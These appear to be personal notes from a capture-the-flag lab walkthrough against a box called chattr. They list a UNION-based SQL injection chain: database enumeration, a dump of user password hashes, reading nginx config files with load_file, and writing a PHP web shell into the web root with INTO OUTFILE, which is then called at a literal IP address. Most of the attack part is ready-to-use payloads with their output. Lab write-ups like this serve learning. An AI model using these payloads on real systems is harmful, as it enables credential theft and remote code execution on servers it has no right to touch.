1. Finding places where sqli possible
	- Use `'`, etc. in different fields
2. Bypassing broswer validation
	- Usage of burp suite to overcome this
3. Another sql
	- Again, have to check burpsuite for the response
		- `HTTP/1.1 500 Internal Server Error`
			- Means found an sql injection
	- `cn') UNION select 1,2,3,4-- -`
		- To find 
		- Additional `)`! Had to guess. 
		- 4 works, and 3 and 4 shown.
	- `cn') UNION select 1,database(),2,3-- -` to find current database
		- database found: `chattr`
	- `cn') UNION select 1,2,schema_name,4 from INFORMATION_SCHEMA.SCHEMATA-- -`
		- `information_schema` and `chattr` are the only 2 databases
	- `cn') UNION select 1,2, table_name, table_schema from information_schema.tables`
		- `Users`, `InvitationCodes` and `Tables` are the 3 tables in `chattr`
	- `cn') UNION select 1,2,COLUMN_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS-- - `
		- `Username`, `Password`, `InvitationCode`, `AccountCreated` , `InvitationCodeID`, `MessageID`, `FromID`, `ToID`, `Message`, `SentTime` are columns in `chattr`
	- Finally time to get what we need
	- `cn') UNION select 1,2,Username, Pssword from chattr.Users`

```
admin
$argon2i$v=19$m=2048,t=4,p=3$dk4wdDBraE0zZVllcEUudA$CdU8zKxmToQybvtHfs1d5nHzjxw9DhkdcVToq6HTgvU
bmdyy
$argon2i$v=19$m=2048,t=4,p=3$UDhiSFgvTU0uZjBNUGljbw$FAraZTOEEidUQJXHmCkgH08iIuYZP/MQpLg+bBcM5o4
dev
$argon2i$v=19$m=2048,t=4,p=3$TGxqYzFCemxBL3dFSkNwRQ$MQ6sZ+WbyTC2YY3GMGhsSXDhg7+oGWoOGvG8caw47Nc
chattr
$argon2i$v=19$m=2048,t=4,p=3$UzY3d1FGclBNQThCTTBmUw$wbFe74g6vSKuTGXnL4eBeNSeKS+9kya/OMJRS1Gfs50
ethanwang
$argon2i$v=19$m=2048,t=4,p=3$Vnl4WWtiQ2lsYTNpV3Q0Qw$1dZ79gMOQ3m9uENpS5aDNSKFpVpcQVBjXysB/GwHIH8
```

Finding root path for writing file
- From burpsuite, can see that server is nginx/1.22.1
- Default web root for this is `/var/www/html`
	- Doesn't work
- Read config file with
	- `cn') UNION select 1,2,3,load_file("/etc/nginx/nginx.conf")`
	- `user www-data; worker_processes auto; pid /run/nginx.pid; error_log /var/log/nginx/error.log; include /etc/nginx/modules-enabled/*.conf; events { worker_connections 768; # multi_accept on; } http { ## # Basic Settings ## sendfile on; tcp_nopush on; types_hash_max_size 2048; # server_tokens off; # server_names_hash_bucket_size 64; # server_name_in_redirect off; include /etc/nginx/mime.types; default_type application/octet-stream; ## # SSL Settings ## ssl_protocols TLSv1 TLSv1.1 TLSv1.2 TLSv1.3; # Dropping SSLv3, ref: POODLE ssl_prefer_server_ciphers on; ## # Logging Settings ## access_log /var/log/nginx/access.log; ## # Gzip Settings ## gzip on; # gzip_vary on; # gzip_proxied any; # gzip_comp_level 6; # gzip_buffers 16 8k; # gzip_http_version 1.1; # gzip_types text/plain text/css application/json application/javascript text/xml application/xml application/xml+rss text/javascript; ## # Virtual Host Configs ## include /etc/nginx/conf.d/*.conf; include /etc/nginx/sites-enabled/*; } #mail { # # See sample authentication script at: # # http://wiki.nginx.org/ImapAuthenticateWithApachePhpScript # # # auth_http localhost/auth.php; # # pop3_capabilities "TOP" "USER"; # # imap_capabilities "IMAP4rev1" "UIDPLUS"; # # server { # listen localhost:110; # protocol pop3; # proxy on; # } # # server { # listen localhost:143; # protocol imap; # proxy on; # } #}
- Then read `/etc/nginx/sites-enabled/default`
	- We see `/etc/nginx/sites-enabled`. I guess you're uspposed to google to find that the dfault web root is in the `default` file
- `server { listen 443 ssl; server_name chattr.htb; ssl_password_file /root/chattr.key.pass; ssl_certificate /etc/ssl/certs/chattr.crt; ssl_certificate_key /etc/ssl/private/chattr.key; ssl_protocols TLSv1.2 TLSv1.3; ssl_ciphers HIGH:!aNULL:!MD5; root /var/www/chattr-prod; location / { index index.php; try_files $uri $uri/ /index.php?$query_string; } location ~ \.php$ { include snippets/fastcgi-php.conf; fastcgi_pass unix:/run/php/php8.2-fpm.sock; } location ^~ /includes/ { deny all; } }`
	- Find that root is `/var/www/chattr-prod`

Finally, can upload webshell to root directory and access it
- `cn ') union select "",' <?php  system ( $_REQUEST [ 0 ]);  ?> ', "", "" into outfile ' / var /www/chattr-prod/shells.php  '-- - `
- Take note that even if this succeeds, the response is 500 internal error
- Navigate to `https://83.136.249.164:47055/shells.php?0=ls+/'